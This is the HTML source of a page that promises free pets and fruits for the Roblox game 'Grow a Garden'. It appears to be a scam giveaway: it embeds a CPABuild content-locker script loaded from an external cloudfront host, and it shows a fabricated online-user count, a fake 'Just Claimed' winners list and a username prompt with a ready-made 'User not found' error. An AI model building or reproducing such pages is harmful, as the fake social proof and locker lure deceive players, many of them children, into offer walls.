<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Page encoding -->
    <meta charset="UTF-8">
    <!-- Page title -->
    <title>Grow a Garden Free Pets and Fruits - Roblox</title>
    <meta name="description" content="Free Pets and Fruits for Grow a Garden! Claim rewards in Grow a Garden to level up your adventure."/>
    <!-- Adaptive -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, minimum-scale=1.0, viewport-fit=cover">
    <!-- Connecting CSS styles -->
    <link rel="stylesheet" href="./css/reset_style.css">
    <link rel="stylesheet" href="./css/main.css">
    <!-- Connecting the site icon -->
    <link rel="icon" href="./favicon.ico">
    <!-- Connecting jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript">
        var CPABUILDSETTINGS={"it":4086934,"key":"96b7a"};
    </script>
    <script src="https://d1xv7hxes9rviq.cloudfront.net/2aada27.js"></script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-FSSBG3NENC"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-FSSBG3NENC');
    </script>
</head> 
<body>
    <div id="field">
    <img class="floating-fruits" alt="Floating fruit 1" src="/img/pets/Dragonfly.webp">
    </div>
    
    <div class="container">
        <div class="first-page">
            <img class="first-page__img" src="./img/logo.webp" alt="logo" width="300px">
            <p class="first-page__text">Pets and Fruits for Grow a Garden</p>
            <p class="first-page__text">Claim rewards to level up your adventure!</p>
            <div class="first-page__status">
                <div class="status__item">
                    <span class="status__item-title--left" id="status-text">Status:</span>
                    <span class="status__item-title--right" id="status-status">Online</span>
                </div>
                <div class="status__item">
                    <span class="status__item-title--left" id="online-text">Online Users:</span>
                    <span class="status__item-title--right" id="online-counter">314</span>
                </div>
            </div>
            <h2 class="first-page__title">Just Claimed</h2>
            <div class="first-page__winners">
                <div class="winners__item">
                    <img class="winners__item-img" src="./img/fruits/Maple_Resin.webp" alt width="48px" id="winner-1-img">
                    <h6 class="winners__item-title">
                        <span class="winners__item-title--top" id="winner-1-text">SW****Play</span>
                        <span class="winners__item-title--bottom" id="winner-1-time">11 sec ago</span>
                    </h6>
                </div>
                <div class="winners__item">
                    <img class="winners__item-img" src="./img/pets/Golden_Goose.webp" alt width="48px" id="winner-2-img">
                    <h6 class="winners__item-title">
                        <span class="winners__item-title--top" id="winner-2-text">F1d****li</span>
                        <span class="winners__item-title--bottom" id="winner-2-time">15 sec ago</span>
                    </h6>
                </div>
                <div class="winners__item">
                    <img class="winners__item-img" src="./img/pets/Dragonfly.webp" alt width="48px" id="winner-3-img">
                    <h6 class="winners__item-title">
                        <span class="winners__item-title--top" id="winner-3-text">Poi****ris</span>
                        <span class="winners__item-title--bottom" id="winner-3-time">30 sec ago</span>
                    </h6>
                </div>
            </div>
            <h2 class="first-page__title">Select Pets:</h2>
            <div class="first-page__content" id="section-pets">

            </div>
            <h2 class="first-page__title">Select Fruits:</h2>
            <div class="first-page__content" id="section-fruits">

            </div>
        </div>

        <div class="second-page hide">
            <img class="first-page__img" src="./img/logo.webp" alt="logo" width="300px">
            <div class="second-page__bottom-block">
                <h2 class="bottom-block__title">Enter your Username</h2>
                <p class="bottom-block__error hide">Error! User not found</p>
                <input class="bottom-block__input" type="text" placeholder="Your Username" required>
                <button class="bottom-block__btn" id="continue-btn">Claim Fruit</button>
            </div>
            <div class="goods-img" id="item">
                <img src="" id="item-img" alt width="120px" height="120px">
                <p class="goods-img__text" id="item-text"></p>
            </div>
        </div>
    </div>
</body>
<script src="./js/main.js" type="module"></script>
<script>
const field = document.getElementById('field');

// Инициализируем все .floating-fruits
const fruits = [...document.querySelectorAll('.floating-fruits')].map(el => {
  // Размеры изображения (после загрузки они корректные)
  const w = (el.naturalWidth  || el.width  || 170);
  const h = (el.naturalHeight || el.height || 170);

  const rect = field.getBoundingClientRect();
  // Случайная стартовая позиция внутри контейнера
  const x = Math.max(0, Math.min(rect.width  - w, Math.random() * (rect.width  - w)));
  const y = Math.max(0, Math.min(rect.height - h, Math.random() * (rect.height - h)));

  el.style.left = x + 'px';
  el.style.top  = y + 'px';
  el.style.opacity = el.style.opacity || '0.5'; // можно убрать, если не нужно

  // Случайное направление и скорость
  const speed = (Math.random() * 0.6 + 0.2); // px/кадр
  const angle = Math.random() * Math.PI * 2;

  return {
    el, x, y, w, h,
    vx: Math.cos(angle) * speed,
    vy: Math.sin(angle) * speed
  };
});

// Основной цикл
function tick() {
  const rect = field.getBoundingClientRect();

  for (const f of fruits) {
    f.x += f.vx;
    f.y += f.vy;

    // Бортики с учётом размеров картинки
    if (f.x <= 0 || f.x >= rect.width - f.w) {
      f.vx *= -1;
      f.x = Math.max(0, Math.min(rect.width - f.w, f.x));
    }
    if (f.y <= 0 || f.y >= rect.height - f.h) {
      f.vy *= -1;
      f.y = Math.max(0, Math.min(rect.height - f.h, f.y));
    }

    f.el.style.left = f.x + 'px';
    f.el.style.top  = f.y + 'px';
  }

  requestAnimationFrame(tick);
}
tick();
</script>
</html>